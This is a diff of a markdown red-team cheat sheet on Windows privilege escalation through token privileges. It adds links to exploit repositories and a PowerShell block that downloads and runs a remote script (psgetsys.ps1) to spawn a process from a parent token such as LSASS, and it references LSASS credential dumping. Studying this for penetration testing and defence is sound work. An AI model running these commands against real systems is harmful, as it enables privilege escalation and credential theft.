@@ -12,21 +12,28 @@ You can list your privileges with the command below, **but**, you won't see all 
 PS> whoami /priv
 ```
 
-🔥 You can find [way to exploit them on Priv2Admin](https://github.com/gtworek/Priv2Admin) <small>(1.7k ⭐)</small>.
+Privileges are [listed and explained here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
 </div><div>
 
-Privileges are [listed and explained here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
+You can find way to exploit them on: 
+
+* [Priv2Admin](https://github.com/gtworek/Priv2Admin) <small>(1.7k ⭐)</small>
+* [PrivFu](https://github.com/daem0nc0re/PrivFu/) <small>(0.7k ⭐)</small>
+* ...
+
 </div></div>
 
 <hr class="sep-both">
 
-## Privilege2Admin
+## NormalPrompt2Admin
 
 <div class="row row-cols-lg-2"><div>
 
-You may use these as a normal user to escalate to admin or system, and as admin to escalate to system.
+You may use these as a normal user to escalate to admin.
 
 #### SeImpersonate — steal access tokens
+
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
  
 The most common approach is to use [potato](/cybersecurity/red-team/s4.privesc/windows/tools/potato.md) scripts. 
 
@@ -50,15 +57,27 @@ Additional references:
 
 <hr class="sep-both">
 
-## Admin2System
+## ElevatedPromptToAdmin
 
 <div class="row row-cols-lg-2"><div>
 
-You may use these as an admin to escalate system.
+You may use these from an elevated prompt to escalate to admin.
 
 #### SeDebugPrivilege — Dump Process Memory
 
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
 We can use methods shown in [Dump Credentials From LSASS Process](/operating-systems/windows/security/index.md#dump-credentials-from-lsass-process) to dump a process memory, which is often LSASS.
+
+We can also steal and reuse the parent [access token](/operating-systems/windows/security/index.md#access-token) such as LSASS.
+
+```ps
+PS> wget "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" -O psgetsys.ps1
+PS> .\psgetsys.ps1
+PS> [MyProcess]::CreateProcessFromParent(<target_process_pid>,"<command_to_execute>","")
+```
+
+➡️ See also: [PrivFu/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC).
 </div><div>
 </div></div>
 
